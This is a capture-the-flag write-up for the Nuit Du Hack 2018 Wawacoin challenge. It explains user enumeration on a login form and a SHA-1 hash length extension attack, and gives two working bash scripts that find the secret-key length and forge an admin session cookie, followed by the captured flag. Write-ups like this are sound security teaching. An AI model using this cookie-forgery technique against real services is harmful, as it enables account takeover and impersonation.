# Wawacoin

Wawacoin was a 400-point Crypto/Web challenge at **Nuit Du Hack Quals 2018**.
As is [not the first time](https://inshallhack.org/pizzagate_34C3/), we ended
up flagging this challenge about **10 minutes after the end of the CTF**.
Nevertheless, here it goes!

## Challenge description

```  
Wawacoin: 400 pts / Web-Crypto  
Description  
Sell your house, buy WawaCoin cryptocurrency cyber-blockchain, ???, profit.  
```

## Recon

The menu shows links to 3 different pages: **/**, **/login** and
**/register**.

Let's check them all out!

### Page: /

**/** contains static content, with a graph and some text; it's unlikely to be
very interesting for us. The source of the page contains links to two
potentially interesting JavaScript files: **/static/js/wawacoin.js** and
**/js/wawacoin-miner.js**. Unfortunately, the first is empty and the second
doesn't exist.

### Page: /login

**/login** contains a login form to something called **WawaManager**. We throw
some (*unsuccessful*) **random SQLi attempts** at it and try to login with
different credentials, such as **admin:admin** or **root:toor**.  
In the process, we notice that we get two different errors: `Bad username` and
`Bad password`. From that, we deduce that the form is vulnerable to **user
enumeration** and subsequently, that a user with the login "**admin**" exists.
Let's keep that in mind for later.

### Page: /register

**/register** informs us that it is no longer possible to register on the
website, but invites us to try out the website using a "demo" account by
clicking on a link to **/login?demo=1**.

### Page: /login?demo=1 -> /manager

**/login?demo=1** redirects us to **/manager**, which contains a seemingly
totally legit form that invites us to provide our bank card information in
order to verify our identity before entering the demo interface. Doubt
regarding the legitimacy turn to dust as we fill out the required information,
only for them to be **partially** sent (*half the information was missing*) as
a **POST request** to **/stealmoney**, resulting in the page advising us that
we "**need at least 1M bucks for this to work**". Our last shreds of hope turn
to dust as we get the exact same response when trying the same process with
our multimillionaire bank account.

A session cookie was set when accessing the page:
**session=757365723d64656d6f|9183ff6055a46981f2f71cd36430ed3d9cbf6861**.  
After logging out of the demo account and in again, we observe that the cookie
still contains the same value.

Digging a bit deeper, we observe that it is made of two distinct parts
(*separated by a "|"*): the first is the hex value of the string
**user=demo**, while the second seems to be a hash of some kind. Since it is
40 digits long, **we assume it is a SHA-1 hash**. However, the hash is not
equal to **sha1("user=demo")**; modifying any part of the cookie seems to
render it unusable, which leads us to believe that the hash is some kind of
**MAC** for the first part of the cookie, and uses a secret key owned by the
server.

## Exploitation

Though it took us quite a while to figure it out, a **hash length extension
attack** is the only (*and obvious*) way to go here. We may assume that our
aim is to get a hold of another, non-demo user account on the website, which
means that knowing **admin** is a valid user will come in handy.

### Hash length extension attack

The whole explanation between [hash length extension
attacks](vhttps://en.wikipedia.org/wiki/Length_extension_attack) is beyond the
scope of this writeup. The idea behind it, though, is that assuming some
characteristics of the hashing algorithm (*which SHA-1 and MD5 have*), and
**knowing the length of the secret key used, a string and its MAC**, it is
possible to extend said string and to **produce a valid MAC for the extended
string**.

For a clearer explanation, see
[skullsecurity.org](https://blog.skullsecurity.org/2012/everything-you-need-
to-know-about-hash-length-extension-attacks) or
[batard.info](https://journal.batard.info/post/2011/03/04/exploiting-
sha-1-signed-messages).

With the end of the CTF approaching really fast, we stumble upon [hash-
extender](https://github.com/iagox86/hash_extender) and get to work.

### Flag time

While we have a string and its MAC, **we still need to find out the length of
the secret key** in order to launch our hash length extension attack.

To that end, we quickly craft the following dirty script:

```bash  
#!/bin/bash

append=$1

for i in $(seq 1 20)  
do  
   echo $i  
   tmp=$(./hash_extender -d="user=demo" --signature=9183ff6055a46981f2f71cd36430ed3d9cbf6861 --format=sha1 --append "$append" -l $i | grep -v Type | grep -v Secret | cut -d":" -f 2 | tr "\n" "|" | tr -d " " | sed 's/||//g')  
   tmp2=$(echo $tmp | cut -d"|" -f 2)  
   tmp3=$(echo $tmp | cut -d"|" -f 1)  
   cookie=$(echo "$tmp2|$tmp3")  
   curl 'http://wawacoin.challs.malice.fr/manager' -H "Cookie:
session=$cookie"  
done  
```

Then, **we use the response code of the curl request as an oracle**: if the
response code is 200, that means that the cookie is valid (*and that we found
the right length for the secret key*); otherwise, we get redirected out of the
manager and the status code is thus 302. The value of `$append` doesn't matter
at this point.

After running the above script, we figure out that the secret key is **16
characters long**.  
All that's left is to find a proper payload now.

With our little CTF experience, we quickly try out the value
**user=demo;user=admin** and obtain the flag (*albeit too late :(*):

```bash  
#!/bin/bash

append=";user=admin"  
i=16  
tmp=$(./hash_extender -d="user=demo" --signature=9183ff6055a46981f2f71cd36430ed3d9cbf6861 --format=sha1 --append "$append" -l $i | grep -v Type | grep -v Secret | cut -d":" -f 2 | tr "\n" "|" | tr -d " " | sed 's/||//g')  
tmp2=$(echo $tmp | cut -d"|" -f 2)  
tmp3=$(echo $tmp | cut -d"|" -f 1)  
cookie=$(echo "$tmp2|$tmp3")  
curl 'http://wawacoin.challs.malice.fr/manager' -H "Cookie: session=$cookie"  
```

And… **Flagged!**

**Flag: NDH{c7774051db4b880da67598770c955ff99363e76d}**

Original writeup (https://inshallhack.org/wawacoin_ndh_quals_2018/).